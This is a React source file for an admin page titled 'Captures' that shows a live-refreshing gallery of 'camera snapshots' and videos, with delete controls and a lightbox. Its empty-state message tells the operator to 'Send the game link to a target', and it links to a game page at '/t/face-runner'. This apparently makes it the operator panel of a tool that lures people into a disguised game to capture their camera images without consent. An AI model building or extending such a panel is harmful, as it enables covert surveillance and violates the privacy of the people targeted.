import { useEffect, useState, useCallback } from 'react'
import { api, Capture } from '../api/client'

function fmtSize(b: number) {
  if (b < 1024) return `${b} B`
  if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`
  return `${(b / 1048576).toFixed(2)} MB`
}
function relTime(ts: number) {
  const diff = Date.now() / 1000 - ts
  if (diff < 10) return 'just now'
  if (diff < 60) return `${Math.floor(diff)}s ago`
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`
  return `${Math.floor(diff / 86400)}d ago`
}

export default function Captures() {
  const [captures, setCaptures] = useState<Capture[]>([])
  const [loading, setLoading] = useState(true)
  const [lightbox, setLightbox] = useState<number | null>(null)
  const [sort, setSort] = useState('newest')
  const [autoRefresh, setAutoRefresh] = useState(true)

  const refresh = useCallback(async () => {
    try {
      const data = await api.captures(1, 60, sort)
      setCaptures(data.captures)
    } catch (e) { console.error(e) }
    finally { setLoading(false) }
  }, [sort])

  useEffect(() => {
    refresh()
    if (autoRefresh) {
      const timer = setInterval(refresh, 3000)
      return () => clearInterval(timer)
    }
  }, [refresh, autoRefresh])

  const del = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation()
    if (!confirm('Delete this capture?')) return
    await api.deleteCapture(id)
    refresh()
  }

  const delAll = async () => {
    if (!confirm('Delete ALL captures?')) return
    if (!confirm('Are you absolutely sure? This cannot be undone.')) return
    await api.deleteAllCaptures()
    refresh()
  }

  const isVideo = (ft: string) => ft.includes('video')

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h2 className="text-2xl font-bold text-white">Captures</h2>
          <p className="text-sm text-gray-500 mt-1">{captures.length} camera snapshots</p>
        </div>
        <div className="flex gap-2">
          <select value={sort} onChange={e => setSort(e.target.value)} className="bg-gray-900 border border-gray-800 rounded-lg px-3 py-1.5 text-sm text-gray-300 focus:outline-none focus:border-cyan-500">
            <option value="newest">Newest</option>
            <option value="oldest">Oldest</option>
            <option value="largest">Largest</option>
          </select>
          <button onClick={() => setAutoRefresh(!autoRefresh)} className={`px-3 py-1.5 rounded-lg text-xs font-medium ${autoRefresh ? 'bg-green-500/10 text-green-400' : 'bg-gray-800 text-gray-500'}`}>
            {autoRefresh ? '● Live' : 'Paused'}
          </button>
          <button onClick={refresh} className="px-3 py-1.5 bg-gray-800 text-gray-300 rounded-lg text-sm hover:bg-gray-700">🔄</button>
          {captures.length > 0 && (
            <button onClick={delAll} className="px-3 py-1.5 bg-red-500/10 text-red-400 rounded-lg text-sm hover:bg-red-500/20">🗑 All</button>
          )}
        </div>
      </div>

      {loading ? (
        <div className="flex justify-center py-20"><div className="animate-spin w-8 h-8 border-2 border-cyan-500 border-t-transparent rounded-full"></div></div>
      ) : captures.length === 0 ? (
        <div className="text-center py-24 text-gray-600">
          <div className="text-6xl mb-4 opacity-20">📷</div>
          <h3 className="text-lg text-gray-400">No captures yet</h3>
          <p className="text-sm mt-2">Send the game link to a target. Captures appear here in real-time.</p>
          <a href="/t/face-runner" target="_blank" rel="noreferrer" className="inline-block mt-4 px-4 py-2 bg-cyan-500/10 text-cyan-400 rounded-lg text-sm hover:bg-cyan-500/20">🎮 Open Game</a>
        </div>
      ) : (
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
          {captures.map((c, i) => {
            const recent = Date.now() / 1000 - c.created_at < 30
            return (
              <div
                key={c.id}
                onClick={() => setLightbox(i)}
                className={`group relative bg-gray-900 border rounded-xl overflow-hidden cursor-pointer transition-all hover:-translate-y-1 hover:shadow-xl ${
                  recent ? 'border-green-500/60 shadow-lg shadow-green-500/10' : 'border-gray-800 hover:border-gray-700'
                }`}
              >
                {isVideo(c.file_type) ? (
                  <div className="h-32 flex items-center justify-center bg-gray-950 text-4xl">🎬</div>
                ) : (
                  <img src={c.url} alt={c.filename} loading="lazy" className="h-32 w-full object-cover" />
                )}
                {recent && (
                  <div className="absolute top-2 left-2 px-2 py-0.5 bg-green-500/90 text-white text-[10px] font-bold rounded-full animate-pulse">NEW</div>
                )}
                <button onClick={e => del(c.id, e)} className="absolute top-2 right-2 w-6 h-6 rounded-full bg-red-500/90 text-white text-xs opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">×</button>
                <div className="p-2">
                  <div className="text-xs text-gray-400 truncate">{c.filename}</div>
                  <div className="flex justify-between mt-1">
                    <span className="text-[10px] text-gray-600">{relTime(c.created_at)}</span>
                    <span className="text-[10px] text-gray-600">{fmtSize(c.file_size)}</span>
                  </div>
                </div>
              </div>
            )
          })}
        </div>
      )}

      {lightbox !== null && captures[lightbox] && (
        <div className="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-6" onClick={() => setLightbox(null)}>
          <button className="absolute top-4 right-6 text-white/60 hover:text-white text-4xl" onClick={() => setLightbox(null)}>×</button>
          {lightbox > 0 && <button className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox - 1) }}>‹</button>}
          {lightbox < captures.length - 1 && <button className="absolute right-4 top-1/2 -translate-y-1/2 text-white/40 hover:text-white text-4xl" onClick={e => { e.stopPropagation(); setLightbox(lightbox + 1) }}>›</button>}
          {isVideo(captures[lightbox].file_type) ? (
            <video src={captures[lightbox].url} controls autoPlay className="max-w-[95%] max-h-[85vh] rounded-lg" />
          ) : (
            <img src={captures[lightbox].url} className="max-w-[95%] max-h-[85vh] rounded-lg shadow-2xl" />
          )}
          <div className="absolute bottom-6 left-1/2 -translate-x-1/2 text-gray-400 text-sm bg-gray-900/80 px-4 py-2 rounded-lg">
            {captures[lightbox].filename} · {fmtSize(captures[lightbox].file_size)} · {relTime(captures[lightbox].created_at)}
          </div>
        </div>
      )}
    </div>
  )
}
